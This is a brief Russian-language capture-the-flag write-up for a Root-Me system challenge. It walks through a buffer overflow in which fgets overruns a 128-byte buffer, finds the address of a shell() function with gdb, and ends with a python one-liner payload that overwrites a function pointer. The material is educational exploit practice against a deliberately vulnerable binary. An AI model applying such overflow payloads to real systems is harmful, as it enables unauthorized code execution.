ssh -p 2222 app-systeme-ch15@challenge02.root-me.org 



Мы снова видим миссконфиг где буфер определен на 128 байт, а fgets принимает 133 байта

Скорее всего после буфера будет rip rbp, и если мы перепишем адрес возврата на функцию shell() то достигнем результат

UPD: После буфера лежит указатель на функцию, а не адрес возврата main, до адреса еще 4 байта через BP, мы бы не смогли до него дотянуться

Для начала надо определить адресс shell 

в gdb i address shell 
> 0x8048516

Можем посмотреть на буфер после ввода тестового значения АААА

fgets кладет его на адрес ebp-0x8c и возвращает в eax
можно проверить строку по этому адресу

Собираем payload

(python3 -c "import sys; sys.stdout.buffer.write(b'A'*128+b'\x16\x85\x48\x80\x00')"; cat) | ./ch15
